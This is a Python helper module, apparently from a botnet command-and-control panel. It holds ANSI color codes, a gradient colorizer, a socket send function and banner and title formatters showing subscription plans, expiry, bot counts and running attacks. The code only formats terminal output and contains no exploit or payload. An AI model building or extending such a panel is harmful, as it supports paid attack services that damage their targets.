from colorama import Fore

ANSI_CLEAR = '\033[2J\033[H'

COLORS = {
    "G": '\033[1;32m',
    "C": '\033[1;37m',
    "Y": '\033[1;33m',
    "B": '\033[1;34m',
    "R": '\033[1;31m',
    "Q": '\033[1;36m',
    "GRAY": '\033[90m',
    "RESET": '\033[0m',
}

def colorize_text_gradient(text):
    start_color = (0, 255, 0)
    end_color = (255, 255, 0)
    
    num_letters = len(text)
    if num_letters == 0:
        return text
        
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters
    
    reset_color = "\033[0m"
    current_color = start_color
    colored_text = ""
    
    for i, letter in enumerate(text):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_text += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)
    
    return colored_text

def send(socket_obj, data, escape=True, reset=True):
    if reset:
        data += COLORS["RESET"]
    if escape:
        data += '\r\n'
    try:
        socket_obj.send(data.encode('utf-8'))
    except:
        pass

def format_banner_info(username, user_data, bots_count):
    return (
        f" Username: {username} | "
        f"Plan: {user_data.get('plan')} | "
        f"Role: {user_data.get('role')} | "
        f"Expires in: {user_data.get('days_remaining')} days | "
        f"Bots: {bots_count}"
    )

def format_title(c2_name, username, user_data, clients_count, bots_count, attacks_count, max_attacks):
    from src.utils.security import sanitize_log
    sanitized_username = sanitize_log(username)
    title = f"\33]0;{c2_name} | "
    title += f"Username: {sanitized_username} | "
    title += f"Plan: {user_data.get('plan')} | "
    title += f"Expires: {user_data.get('expires_at')} | "
    title += f"Users: {clients_count} | "
    title += f"Bots: {bots_count} | "
    title += f"Running: {attacks_count}/{max_attacks}\a"
    return title

